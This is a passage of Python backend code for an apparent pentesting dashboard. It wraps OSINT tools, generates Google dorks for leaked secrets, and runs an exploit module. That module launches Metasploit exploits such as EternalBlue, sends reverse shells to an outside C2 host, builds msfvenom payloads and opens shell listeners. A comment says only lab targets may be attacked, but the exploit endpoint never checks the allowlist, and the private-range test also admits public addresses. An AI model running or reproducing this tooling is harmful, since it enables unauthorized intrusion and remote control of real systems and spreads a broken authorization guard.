                asns.append(f"{a} — {label}" if label else a)
    # Extract interesting URLs — filter out long tracking/redirect URLs
    urls = []
    url_block = re.search(r"Interesting Urls found.*?\n(.*?)(?:\[\*\]|\Z)", out, re.DOTALL)
    if url_block:
        for l in url_block.group(1).splitlines():
            u = l.strip()
            if u.startswith("http") and len(u) <= 120 and "upn=" not in u and "utm_" not in u:
                urls.append(u)
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "email_osint", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"email_osint",
            "emails":emails[:50],"hosts":hosts[:50],"ips":ips[:20],
            "asns":asns[:20],"interesting_urls":urls[:30],
            "total_emails":len(emails),"raw_output":out[:5000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/recon_ng")
async def osint_recon_ng(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    import tempfile, os as _os
    # Install modules then run — recon-ng apt install has no modules by default
    script = (
        f"workspaces create oscp_{host.replace('.','_')}\n"
        f"marketplace install recon/domains-hosts/certificate_transparency\n"
        f"marketplace install recon/domains-hosts/hackertarget\n"
        f"modules load recon/domains-hosts/certificate_transparency\n"
        f"options set SOURCE {host}\nrun\n"
        f"modules load recon/domains-hosts/hackertarget\n"
        f"options set SOURCE {host}\nrun\n"
        f"show hosts\nexit\n"
    )
    with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
        f.write(script); path = f.name
    try:
        result = await run_tool(["recon-ng", "-r", path], timeout=180)
    finally:
        try: _os.unlink(path)
        except: pass
    out = result.get("output", "")
    hosts = list(set(re.findall(r"[a-zA-Z0-9\-\.]+\." + re.escape(host), out)))
    hosts = [h for h in hosts if h != host and not h.startswith(".")]
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "recon_ng", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"recon_ng",
            "hosts":hosts[:50],"raw_output":out[:3000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/spiderfoot")
async def osint_spiderfoot(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    result = await run_tool(
        ["python3", "-m", "spiderfoot.cli", "-s", host,
         "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR",
         "-m", "sfp_dnsresolve,sfp_googlesearch,sfp_dnsbrute"],
        timeout=180
    )
    out = result.get("output", "")
    if not out.strip() or "No module" in out:
        result2 = await run_tool(["sfcli.py", "-s", host, "-t", "INTERNET_NAME,IP_ADDRESS,EMAILADDR"], timeout=180)
        out = result2.get("output", out)
    emails = list(set(re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", out)))
    ips    = list(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out)))
    hosts  = list(set(re.findall(r"[a-zA-Z0-9\-]+\." + re.escape(host), out)))
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "spiderfoot", req.target, result)
    return {"scan_id":scan_id,"target":req.target,"tool":"spiderfoot",
            "emails":emails[:30],"ips":ips[:20],"hosts":hosts[:30],"raw_output":out[:3000],
            "timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/virustotal")
async def osint_virustotal(req: ScanRequest, user=Depends(verify_token)):
    api_key = req.api_key or os.getenv("VIRUSTOTAL_KEY", "")
    if not api_key:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
                "error":"No VirusTotal API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
    host = _recon_host(req.target)
    try:
        import urllib.request
        is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host))
        url = f"https://www.virustotal.com/api/v3/{'ip_addresses' if is_ip else 'domains'}/{host}"
        vt_req = urllib.request.Request(url, headers={"x-apikey": api_key})
        with urllib.request.urlopen(vt_req, timeout=15) as resp:
            data = json.loads(resp.read())
        attrs = data.get("data",{}).get("attributes",{})
        stats = attrs.get("last_analysis_stats",{})
        malicious  = stats.get("malicious",0)
        suspicious = stats.get("suspicious",0)
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"virustotal",
                "malicious":malicious,"suspicious":suspicious,
                "harmless":stats.get("harmless",0),"total_engines":sum(stats.values()),
                "reputation":attrs.get("reputation",0),
                "categories":list(attrs.get("categories",{}).values())[:5],
                "tags":attrs.get("tags",[])[:5],
                "threat_detected":malicious>0 or suspicious>0,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"virustotal",
                "error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/abuseipdb")
async def osint_abuseipdb(req: ScanRequest, user=Depends(verify_token)):
    api_key = req.api_key or os.getenv("ABUSEIPDB_KEY", "")
    host = _recon_host(req.target)
    if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
        try:
            import socket; host = socket.gethostbyname(host)
        except: pass
    if not api_key:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb","ip":host,
                "error":"No AbuseIPDB API key — add it in Settings","timestamp":datetime.datetime.utcnow().isoformat()}
    try:
        import urllib.request, urllib.parse
        url = f"https://api.abuseipdb.com/api/v2/check?ipAddress={urllib.parse.quote(host)}&maxAgeInDays=90"
        r = urllib.request.Request(url, headers={"Key":api_key,"Accept":"application/json"})
        with urllib.request.urlopen(r, timeout=15) as resp:
            d = json.loads(resp.read()).get("data",{})
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"abuseipdb","ip":host,
                "abuse_score":d.get("abuseConfidenceScore",0),
                "total_reports":d.get("totalReports",0),
                "country":d.get("countryCode",""),"isp":d.get("isp",""),
                "domain":d.get("domain",""),"is_whitelisted":d.get("isWhitelisted",False),
                "threat_detected":d.get("abuseConfidenceScore",0)>25,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"abuseipdb",
                "ip":host,"error":str(e),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/geoip")
async def osint_geoip(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    import urllib.request, socket as _sock
    try:
        ip = host
        if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
            try: ip = _sock.gethostbyname(host)
            except: ip = host
        with urllib.request.urlopen(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query,reverse",
            timeout=10
        ) as resp:
            data = json.loads(resp.read())
        if data.get("status") == "fail":
            raise Exception(data.get("message","ip-api failed"))
        scan_id = str(uuid.uuid4())
        return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
                "ip":data.get("query",ip),"city":data.get("city",""),
                "region":data.get("regionName",""),"country":data.get("country",""),
                "org":data.get("org","") or data.get("isp",""),
                "timezone":data.get("timezone",""),
                "loc":f"{data.get('lat','')},{data.get('lon','')}",
                "hostname":data.get("reverse",""),
                "isp":data.get("isp",""),"as_info":data.get("as",""),
                "timestamp":datetime.datetime.utcnow().isoformat()}
    except Exception:
        try:
            with urllib.request.urlopen(f"https://ipinfo.io/{host}/json", timeout=10) as resp:
                data = json.loads(resp.read())
            scan_id = str(uuid.uuid4())
            return {"scan_id":scan_id,"target":req.target,"tool":"geoip",
                    "ip":data.get("ip",host),"city":data.get("city",""),
                    "region":data.get("region",""),"country":data.get("country",""),
                    "org":data.get("org",""),"timezone":data.get("timezone",""),
                    "loc":data.get("loc",""),"hostname":data.get("hostname",""),
                    "timestamp":datetime.datetime.utcnow().isoformat()}
        except Exception as e2:
            return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"geoip",
                    "error":str(e2),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/sherlock")
async def osint_sherlock(req: ScanRequest, user=Depends(verify_token)):
    t = req.target.strip()
    # Extract bare username — reject if it looks like an IP, domain, or URL
    if t.startswith("http://") or t.startswith("https://"):
        from urllib.parse import urlparse as _up
        t = _up(t).hostname or t
    username = t.lstrip("@").split("/")[-1].split("?")[0].strip()
    is_ip = bool(re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", username))
    is_domain = bool(re.match(r"^[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}$", username)) and not is_ip
    if not username or len(username) < 2 or is_ip or is_domain:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"sherlock",
                "error":"Sherlock requires a username — not an IP or domain",
                "username":"","accounts_found":[],"total":0,
                "timestamp":datetime.datetime.utcnow().isoformat()}
    found = await _username_osint(username)
    out = "\n".join(f"[+] {f['platform']}: {f['url']}" for f in found)
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "sherlock", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"sherlock",
            "username":username,"accounts_found":[f["url"] for f in found],"total":len(found),
            "raw_output":out,"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/hibp")
async def osint_hibp(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    try:
        import urllib.request
        url = f"https://haveibeenpwned.com/api/v3/breacheddomain/{host}"
        r = urllib.request.Request(url, headers={"User-Agent":"oscp-dashboard","hibp-api-key":req.api_key or ""})
        try:
            with urllib.request.urlopen(r, timeout=10) as resp:
                data = json.loads(resp.read())
            emails = list(data.keys())[:50]
            scan_id = str(uuid.uuid4())
            return {"scan_id":scan_id,"target":req.target,"tool":"hibp","checked":True,
                    "breaches":emails,"total":len(emails),"timestamp":datetime.datetime.utcnow().isoformat()}
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                        "breaches":[],"total":0,"timestamp":datetime.datetime.utcnow().isoformat()}
            if e.code == 401:
                return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                        "error":"HIBP API key required — get free key at haveibeenpwned.com/API/Key",
                        "breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}
            raise
    except Exception as e:
        return {"scan_id":str(uuid.uuid4()),"target":req.target,"tool":"hibp","checked":True,
                "error":str(e),"breaches":[],"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/dnstwist")
async def osint_dnstwist(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    loop = asyncio.get_event_loop()
    results = await loop.run_in_executor(None, _dnstwist_check, host)
    clean = [{"domain":d["domain"],"fuzzer":"python","dns_a":[d["domain"]]} for d in results]
    out = "\n".join(d["domain"] for d in results)
    scan_id = str(uuid.uuid4()); save_scan(scan_id, "dnstwist", req.target, {"output":out})
    return {"scan_id":scan_id,"target":req.target,"tool":"dnstwist",
            "domains":clean,"total":len(clean),
            "raw_output":out[:2000],"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/googledorks")
async def osint_googledorks(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    dorks = [
        f'site:{host} filetype:pdf',
        f'site:{host} filetype:xls OR filetype:xlsx OR filetype:csv',
        f'site:{host} filetype:sql OR filetype:bak OR filetype:backup',
        f'site:{host} inurl:admin OR inurl:login OR inurl:dashboard',
        f'site:{host} inurl:config OR inurl:setup OR inurl:install',
        f'site:{host} intext:password OR intext:"api_key" OR intext:"secret"',
        f'site:{host} inurl:".env" OR inurl:".git" OR inurl:"wp-config"',
        f'site:{host} inurl:phpinfo OR inurl:phpinfo.php',
        f'site:{host} intitle:"index of" OR intitle:"directory listing"',
        f'site:{host} intext:"sql syntax" OR intext:"mysql error" OR intext:"ORA-"',
        f'site:{host} ext:log OR ext:txt inurl:log',
        f'"{host}" site:pastebin.com OR site:paste.ee OR site:hastebin.com',
        f'"{host}" site:github.com password OR secret OR api_key',
        f'"{host}" intext:"@{host}" email list',
        f'related:{host}',
    ]
    scan_id = str(uuid.uuid4())
    return {"scan_id":scan_id,"target":req.target,"tool":"googledorks",
            "dorks":dorks,"total":len(dorks),"timestamp":datetime.datetime.utcnow().isoformat()}

@app.post("/api/osint/maltego")
async def osint_maltego(req: ScanRequest, user=Depends(verify_token)):
    host = _recon_host(req.target)
    guide = f"""Maltego CE Guide for: {host}

1. Open Maltego CE -> New Graph
2. Drag a 'Domain' entity -> type '{host}'
3. Right-click -> Run Transforms:
   - To DNS Name [All]        -> discovers subdomains
   - To IP Address [DNS]      -> resolves IPs
   - To Website [DNS]         -> finds related sites
   - To MX Record [DNS]       -> finds mail servers
4. On each IP found:
   - To Netblock [Owner]      -> finds IP ranges
   - To AS Number             -> finds hosting provider
5. On each email/person found:
   - To Social Media Profiles -> finds social accounts

Key transforms for {host}:
  paterva.com/maltego-ce/ — free community edition
  Transforms: DNS, Shodan, HaveIBeenPwned, Twitter
"""
    scan_id = str(uuid.uuid4())
    return {"scan_id":scan_id,"target":req.target,"tool":"maltego",
            "guide":guide,"host":host,"timestamp":datetime.datetime.utcnow().isoformat()}


# ═══════════════════════════════════════════════════════════════
#  EXPLOIT MODULE
# ═══════════════════════════════════════════════════════════════

class ExploitRequest(BaseModel):
    target:         str = ""
    port:           int = 445
    lhost:          str = ""
    lport:          int = 4444
    msf_module:     str = ""
    msf_payload:    str = "windows/x64/shell_reverse_tcp"
    payload_format: str = "exe"
    query:          str = ""
    extra_opts:     str = ""

EXPLOIT_SESSIONS: dict = {}


@app.get("/api/exploit/lhost")
async def exploit_lhost(user=Depends(verify_token)):
    """Return the canonical LHOST for reverse shells. The frontend auto-fills
    this so users don't need to know their own VPS IP. c2.vulnuslab.com is a
    DNS-only A record (NOT Cloudflare-proxied) so reverse shells from external
    targets bypass the CDN and connect directly to the Kali container, which
    has ports 4444-4500 mapped on the host.
    """
    lhost = os.environ.get("LHOST_DOMAIN", "c2.vulnuslab.com")
    resolved_ip = None
    try:
        import socket as _socket
        resolved_ip = _socket.gethostbyname(lhost)
    except Exception:
        pass
    return {
        "lhost": lhost,
        "resolved_ip": resolved_ip,
        "lport_range": "4444-4500",
        "default_lport": 4444,
        "warning": "Targets must be able to reach this host on the LPORT for reverse shells to work."
    }


def _suggest_exploit_module(target_os: str = "", target_port: int = 0, target_service: str = ""):
    """Map a target's OS + port + service to a recommended Metasploit module.
    Used by the frontend to auto-fill the MSF Module field intelligently
    instead of forcing users to memorize module paths.
    """
    o = (target_os or "").lower()
    s = (target_service or "").lower()
    p = int(target_port or 0)
    # Web targets (HTTP/HTTPS) — no kernel-level Metasploit module fits
    if p in (80, 443, 8080, 8443, 3000, 8000) or "http" in s or "web" in o:
        return {
            "module": "",
            "payload": "",
            "format": "php",
            "advice": "Web target detected. Active MSF exploitation is unlikely to fit — use VAPT scanner first, then exploit specific findings (XSS, SQLi, IDOR) manually or via custom payload."
        }
    # Windows SMB
    if p == 445 or "smb" in s or "windows" in o:
        return {
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "format": "exe",
            "advice": "Windows SMB target — EternalBlue (MS17-010) is the classic choice. Verify with vuln check first."
        }
    # Linux SSH / generic
    if p == 22 or "ssh" in s:
        return {
            "module": "auxiliary/scanner/ssh/ssh_login",
            "payload": "linux/x64/shell_reverse_tcp",
            "format": "elf",
            "advice": "SSH target — try credential bruteforce (auxiliary/scanner/ssh/ssh_login) before exploits."
        }
    # FTP
    if p == 21 or "ftp" in s:
        return {
            "module": "auxiliary/scanner/ftp/ftp_login",
            "payload": "linux/x64/shell_reverse_tcp",
            "format": "elf",
            "advice": "FTP target — try credential bruteforce first; vsftpd 2.3.4 has a backdoor exploit."
        }
    # vsftpd backdoor
    if "vsftpd" in s.lower():
        return {
            "module": "exploit/unix/ftp/vsftpd_234_backdoor",
            "payload": "cmd/unix/interact",
            "format": "elf",
            "advice": "vsftpd 2.3.4 — known backdoor exploit available."
        }
    # Samba (Linux SMB)
    if "samba" in s.lower():
        return {
            "module": "exploit/multi/samba/usermap_script",
            "payload": "cmd/unix/reverse_netcat",
            "format": "elf",
            "advice": "Samba target — usermap_script exploit if version vulnerable."
        }
    return {
        "module": "",
        "payload": "",
        "format": "exe",
        "advice": "Unable to suggest a module — provide target OS + port, or use Search Exploits to find candidates."
    }


@app.get("/api/exploit/suggest")
async def exploit_suggest(os: str = "", port: int = 0, service: str = "", user=Depends(verify_token)):
    """Suggest an MSF module/payload combo for a target. Lets the frontend
    auto-fill correctly instead of leaving users guessing.
    """
    return _suggest_exploit_module(os, port, service)


# Targets the platform is contractually authorized to actively exploit. Any
# active exploitation request against a host NOT on this list must be blocked
# at the backend — relying on the frontend alone leaves us legally exposed.
EXPLOIT_ALLOWLIST = {
    # User's own VPS lab containers (internal)
    "lab_dvwa", "lab_webgoat", "lab_juiceshop", "lab_bwapp", "lab_mutillidae",
    "lab_metasploitable",  # one container exposing many vulnerable services
    # Public vulnerable demos explicitly authorized by their owners
    "demo.testfire.net", "testphp.vulnweb.com", "testasp.vulnweb.com",
    "testaspnet.vulnweb.com", "testhtml5.vulnweb.com", "rest.vulnweb.com",
    "zero.webappsecurity.com", "www.webscantest.com", "hackazon.webscantest.com",
    "juice-shop.herokuapp.com",
    # Localhost / private RFC1918 (user's own infra)
    "localhost", "127.0.0.1",
}


def _is_target_allowed(target: str) -> bool:
    """Return True if a target host is on the legal allowlist OR is in private
    RFC1918 / loopback ranges (user's own infrastructure).
    """
    if not target:
        return False
    host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0].lower().strip()
    if host in EXPLOIT_ALLOWLIST:
        return True
    # RFC1918 + loopback + Docker bridge (always allowed — user owns it)
    if host.startswith(("10.", "127.", "192.168.", "172.16.", "172.17.", "172.18.",
                       "172.19.", "172.2", "172.3")):
        return True
    return False


@app.post("/api/exploit/check-allowed")
async def exploit_check_allowed(req: ExploitRequest, user=Depends(verify_token)):
    """Frontend calls this BEFORE running active exploitation. Returns whether
    the target is on the allowlist + the reason if not. Avoids legal exposure
    from users pointing the platform at random sites.
    """
    allowed = _is_target_allowed(req.target)
    return {
        "target": req.target,
        "allowed": allowed,
        "reason": None if allowed else "Target is not on the legal allow-list. Active exploitation against unauthorized hosts is illegal (CFAA / IT Act 2000). Use Web App Pentesting for passive scanning, or contact support to add your target to the allow-list with proof of authorization.",
        "allowed_examples": ["lab_webgoat", "demo.testfire.net", "testphp.vulnweb.com", "127.0.0.1", "10.x.x.x"]
    }


@app.post("/api/exploit/search")
async def exploit_search(req: ExploitRequest, user=Depends(verify_token)):
    q = req.query.strip() or (req.msf_module.split("/")[-1] if req.msf_module else "") or "ms17-010"
    result = await run_tool(["searchsploit", "--json", q], timeout=30)
    out = result.get("output", "")
    exploits = []
    try:
        import json as _json
        data = _json.loads(out)
        for e in (data.get("RESULTS_EXPLOIT") or data.get("RESULTS_SHELLCODE") or []):
            exploits.append({
                "title":    e.get("Title",""),
                "path":     e.get("Path",""),
                "type":     e.get("Type",""),
                "date":     e.get("Date",""),
                "edb_id":   e.get("EDB-ID",""),
                "platform": e.get("Platform",""),
            })
    except Exception:
        for line in out.splitlines():
            if "|" in line and "Title" not in line and "---" not in line:
                parts = [p.strip() for p in line.split("|")]
                if len(parts) >= 2:
                    exploits.append({"title": parts[0], "path": parts[-1]})
    return {"query": q, "total": len(exploits), "exploits": exploits, "raw_output": out}


@app.post("/api/exploit/vulncheck")
async def exploit_vulncheck(req: ExploitRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else req.target
    port = str(req.port) if req.port else "445"
    result = await run_tool(
        ["nmap", "-p", port, "--script", "vuln,exploit", "-T4", "--open", host],
        timeout=180
    )
    out = result.get("output", "")
    vulns = []
    for line in out.splitlines():
        l = line.strip()
        if any(k in l for k in ["CVE-","VULNERABLE","exploitable","vuln"]):
            vulns.append({"detail": l})
    return {"target": req.target, "port": req.port, "total": len(vulns), "vulns": vulns, "raw_output": out}


async def _auto_detect_payload(module: str, preferred: str = "") -> str:
    """Query msfconsole show payloads and pick best compatible one."""
    rc_path = f"/tmp/msf_pl_{uuid.uuid4().hex}.rc"
    with open(rc_path, "w") as f:
        f.write(f"use {module}\nshow payloads\nexit -y\n")
    try:
        result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=60)
    finally:
        try: os.remove(rc_path)
        except: pass
    out = result.get("output", "")
    payloads = []
    for line in out.splitlines():
        m = re.match(r'\s*\d+\s+([\w/]+)\s+', line)
        if m:
            payloads.append(m.group(1))
    if not payloads:
        return preferred
    if preferred in payloads:
        return preferred
    # For backdoor modules prefer interact (no reverse connection needed)
    if "backdoor" in module or "ircd" in module:
        for p in payloads:
            if "interact" in p:
                return p
    # Prefer shell_reverse_tcp > meterpreter for reliability
    for p in payloads:
        if "shell_reverse_tcp" in p:
            return p
    for p in payloads:
        if "reverse" in p:
            return p
    return payloads[0]


def _resolve_lhost_for_target(target: str, user_lhost: str) -> str:
    """Pick the right LHOST for a given target.

    Internal Docker lab containers (lab_*) can't reach c2.vulnuslab.com because
    that resolves to the host's PUBLIC IP — packets would have to leave the
    Docker bridge, hit the public internet, and hairpin back to the same host,
    which most Docker network drivers silently drop. The cleanest path is for
    the target container to connect to the backend container directly over
    the shared oscp_net bridge, addressed by its Docker DNS hostname.

    External targets keep c2.vulnuslab.com (the user's public-facing handle).
    Also resolves any hostname to an IPv4 so Metasploit's strict option
    validator accepts it.
    """
    t = (target or "").lower().strip()
    is_internal = t.startswith("lab_") or t in {"localhost", "127.0.0.1"} or t.startswith(("10.", "172.", "192.168."))
    if is_internal:
        # Use the backend container's own Docker DNS name. Reverse-shell
        # handler is bound inside this same container, so this is a 1-hop
        # connection over the Docker bridge.
        return "oscp_backend"
    # External target: keep what the user supplied. Resolve hostname → IP
    # because MSF rejects some hostnames in OptionValidator.
    if user_lhost and not re.match(r"^\d+\.\d+\.\d+\.\d+$", user_lhost):
        try:
            import socket as _socket
            return _socket.gethostbyname(user_lhost)
        except Exception:
            return user_lhost
    return user_lhost


def _check_port_reachable(host: str, port: int, timeout: float = 5.0) -> bool:
    """Quick TCP connect — is the service alive? Used as a pre-flight before
    running MSF so we fail fast with a clear message instead of an opaque
    Metasploit OptionValidator error 30 seconds later."""
    import socket as _socket
    try:
        s = _socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _resolves(host: str) -> bool:
    """Does this hostname resolve at all from inside this container?"""
    import socket as _socket
    try:
        _socket.gethostbyname(host)
        return True
    except Exception:
        return False


# Lab container → docker-compose service name. Used to surface a clear "the
# container is down, run this command" remediation hint when DNS fails.
LAB_SERVICE_MAP = {
    "lab_dvwa": "dvwa",
    "lab_webgoat": "webgoat",
    "lab_juiceshop": "juiceshop",
    "lab_bwapp": "bwapp",
    "lab_mutillidae": "mutillidae",
    "lab_metasploitable": "metasploitable2",
}


@app.get("/api/exploit/lab-health")
async def exploit_lab_health(user=Depends(verify_token)):
    """Frontend probes this before showing practice-target buttons so users
    see green/red status next to each target. If a container is down they
    know to run `docker compose up -d` instead of running an exploit that
    will fail with a confusing Metasploit error."""
    out = {}
    for lab, service in LAB_SERVICE_MAP.items():
        reachable = _resolves(lab)
        ip = None
        if reachable:
            try:
                import socket as _socket
                ip = _socket.gethostbyname(lab)
            except Exception:
                pass
        out[lab] = {
            "reachable": reachable,
            "ip": ip,
            "service": service,
            "remediation": None if reachable else f"docker compose up -d {service}",
        }
    return out


@app.post("/api/exploit/msf")
async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
    host = _recon_host(req.target) if req.target else req.target
    if not host:
        return {"error": "Target required"}

    # ─── AUTO-FIX PRE-FLIGHT CHECKS ────────────────────────────────
    # Without these, every failure manifests as "Msf::OptionValidateError"
    # or a 30-second hang followed by no session — neither of which tells
    # the user WHY it failed. Fail fast with a specific, actionable error.

    # 1. Does the hostname resolve?
    if not _resolves(host):
        service = LAB_SERVICE_MAP.get(host)
        if service:
            return {
                "error": f"Lab container '{host}' is not running. Start it on the VPS: docker compose up -d {service}",
                "remediation": "container_down",
                "service": service,
                "session_opened": False,
            }
        return {
            "error": f"Cannot resolve target hostname: {host}. Check spelling or DNS.",
            "remediation": "dns_failed",
            "session_opened": False,
        }

    # 2. Is the target service actually listening on the port we're hitting?
    target_port = int(req.port or 80)
    if not _check_port_reachable(host, target_port, timeout=4):
        return {
            "error": f"Target {host}:{target_port} is not reachable. Service may not be running on this port.",
            "remediation": "port_unreachable",
            "session_opened": False,
        }
    # Auto-select the right LHOST: internal Docker lab targets use the backend
    # container's Docker DNS name (oscp_backend), external targets use the
    # public-facing c2.vulnuslab.com (resolved to IP for MSF validator).
    effective_lhost = _resolve_lhost_for_target(req.target or "", req.lhost or "")
    module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
    # Trust the payload the frontend supplied — practice targets ship with a
    # known-good (module, payload) pair. The previous auto-detect logic
    # parsed `show payloads` output with a brittle regex and frequently
    # returned wrong architectures (e.g. aix/ppc for a PHP target), causing
    # Msf::OptionValidateError. Only auto-detect when the user gave nothing.
    payload = (req.msf_payload or "").strip()
    if not payload:
        payload = await _auto_detect_payload(module, "")
    if not payload:
        # Last-resort default — chosen to match the seeded MSF Module above.
        payload = "windows/x64/shell_reverse_tcp"
    # interact/bind/find_tag payloads connect TO the target's open port (or
    # interact directly with a backdoor) — they don't open a listener on our
    # side, so LHOST/LPORT are not relevant for them.
    is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
    # Backdoor-style modules (vsftpd 2.3.4, distccd, samba usermap, ircd) — in
    # modern Metasploit these no longer expose cmd/unix/interact; the module
    # default is something like cmd/linux/http/x86/meterpreter_reverse_tcp,
    # which is a reverse payload that DOES need LHOST/LPORT. So for these
    # modules: skip "set PAYLOAD" (let MSF pick its compatible default) BUT
    # always send LHOST/LPORT regardless of whether the user's stated payload
    # looked like a non-reverse one.
    backdoor_indicators = ["vsftpd_234", "distcc_exec", "samba/usermap", "unreal_ircd", "ircd_3281_backdoor"]
    is_backdoor_module = any(b in module.lower() for b in backdoor_indicators)

    # Backdoor modules in modern MSF default to reverse payloads → always
    # supply LHOST. For other modules, only when the explicit payload is
    # reverse-style.
    needs_lhost = is_backdoor_module or is_reverse
    if needs_lhost and not effective_lhost:
        return {"error": "LHOST required (module default payload is reverse)"}
    lhost_block = f"set LHOST {effective_lhost}\nset LPORT {req.lport}\n" if needs_lhost and effective_lhost else ""
    payload_block = "" if is_backdoor_module else f"set PAYLOAD {payload}\n"

    rc = (
        f"use {module}\n"
        f"set RHOSTS {host}\n"
        f"set RPORT {req.port}\n"
        + lhost_block +
        payload_block +
        f"set ExitOnSession false\n"
        f"run -j\n"
        f"sleep 25\n"
        f"sessions -l\n"
        f"exit -y\n"
    )
    rc_path = f"/tmp/msf_{uuid.uuid4().hex}.rc"
    with open(rc_path, "w") as f:
        f.write(rc)
    result = await run_tool(["msfconsole", "-q", "-r", rc_path], timeout=90)
    try:
        os.remove(rc_path)
    except:
        pass
    out = result.get("output", "")
    session_opened = "Meterpreter session" in out or "Command shell session" in out or "session 1 opened" in out.lower()
    session_id_m = re.search(r'session (\d+) opened', out, re.IGNORECASE)
    session_id = int(session_id_m.group(1)) if session_id_m else (1 if session_opened else None)
    error = None
    for line in out.splitlines():
        if "[-]" in line or "Error" in line or "failed" in line.lower():
            error = line.strip()
            break
    message = "Session opened" if session_opened else (error or "No session — check module/payload/target compatibility")
    return {
        "target": req.target, "module": module, "payload": payload,
        "session_opened": session_opened, "session_id": session_id,
        "error": error, "message": message,
        "raw_output": out
    }


@app.post("/api/exploit/payload")
async def exploit_payload(req: ExploitRequest, user=Depends(verify_token)):
    if not req.lhost:
        return {"error": "LHOST required"}
    payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
    fmt     = req.payload_format or "exe"
    out_file = f"/tmp/payload_{uuid.uuid4().hex}.{fmt}"
    cmd = [
        "msfvenom", "-p", payload,
        f"LHOST={req.lhost}", f"LPORT={req.lport}",
        "-f", fmt, "-o", out_file
    ]
    result = await run_tool(cmd, timeout=60)
    out = result.get("output", "")
    size = None
    size_m = re.search(r"Payload size:\s*(\d+) bytes", out)
    if size_m:
        size = int(size_m.group(1))
    try:
        os.remove(out_file)
    except:
        pass
    return {
        "payload": payload, "format": fmt,
        "lhost": req.lhost, "lport": req.lport,
        "size": size, "raw_output": out,
        "output_file": out_file,
        "listener_cmd": f"nc -lvnp {req.lport}",
        "message": f"Payload generated: {size} bytes ({fmt})" if size else out.strip()
    }


@app.post("/api/exploit/shell/start")
async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
    lport = req.lport or 4444
    lid   = f"exp_shell_{lport}"
    if lid in EXPLOIT_SESSIONS:
        try:
            if EXPLOIT_SESSIONS[lid].server: EXPLOIT_SESSIONS[lid].server.close()
            if EXPLOIT_SESSIONS[lid].writer: EXPLOIT_SESSIONS[lid].writer.close()
        except: pass
    try:
        subprocess.run(["fuser", "-k", f"{lport}/tcp"], capture_output=True)
    except FileNotFoundError:
        try:
            subprocess.run(["pkill", "-f", f":{lport}"], capture_output=True)
        except Exception:
            pass
    except Exception:
        pass
    await asyncio.sleep(0.5)
    session = _ShellSession(lid, lport)
    EXPLOIT_SESSIONS[lid] = session
    try:
        server = await asyncio.start_server(
            lambda r, w: _shell_handler(r, w, lid, EXPLOIT_SESSIONS),
            "0.0.0.0", lport, reuse_port=True)
        session.server = server
        asyncio.create_task(server.serve_forever())
        return {"lid": lid, "port": lport, "status": "waiting", "ok": True,
                "message": f"Listener ready on port {lport}"}
    except Exception as e:
        return {"error": str(e), "lid": lid, "ok": False}


